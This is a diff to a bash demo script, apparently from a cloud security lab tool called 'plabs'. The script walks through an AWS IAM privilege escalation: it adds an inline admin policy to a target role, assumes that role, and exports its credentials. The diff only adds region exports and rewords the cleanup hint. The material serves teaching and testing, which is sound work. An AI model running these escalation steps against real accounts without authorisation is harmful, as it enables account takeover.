@@ -116,6 +116,7 @@ setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 echo "Using region: $AWS_REGION"
 
@@ -134,6 +135,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
@@ -143,6 +145,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
@@ -156,6 +159,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Checking target role's current inline policies${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"
 echo "Target role: $TARGET_ROLE_ARN"
 echo ""
@@ -177,6 +181,7 @@ echo -e "${GREEN}✓ Target role currently has no admin inline policies${NC}\n"
 echo -e "${YELLOW}Step 6: Adding inline admin policy to target role${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "This is the privilege escalation action!"
 echo "Policy name: $INLINE_POLICY_NAME"
 echo ""
@@ -215,6 +220,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 echo -e "${YELLOW}Step 7: Verifying inline policy addition${NC}"
 use_readonly_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Updated inline policies on target role:"
 UPDATED_POLICIES=$(aws iam list-role-policies \
     --role-name $TARGET_ROLE \
@@ -233,6 +239,7 @@ fi
 echo -e "${YELLOW}Step 8: Assuming the target role with admin permissions${NC}"
 use_starting_creds
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 echo "Role ARN: $TARGET_ROLE_ARN"
 
 show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name demo-attack-session --query 'Credentials' --output json"
@@ -247,6 +254,7 @@ export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
 export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 # Keep region consistent
 export AWS_REGION=$AWS_REGION
+export AWS_DEFAULT_REGION="$AWS_REGION"
 
 # Verify we assumed the role
 show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
@@ -316,7 +324,7 @@ echo "- Inline policy '$INLINE_POLICY_NAME' added to: $TARGET_ROLE"
 
 echo -e "\n${RED}⚠ Warning: The target role now has administrative permissions!${NC}"
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
-echo "  ./cleanup_attack.sh or use the plabs TUI/CLI"
+echo "  run plabs cleanup or use the plabs TUI/CLI"
 echo ""
 
 # Mark demo as active for plabs tracking
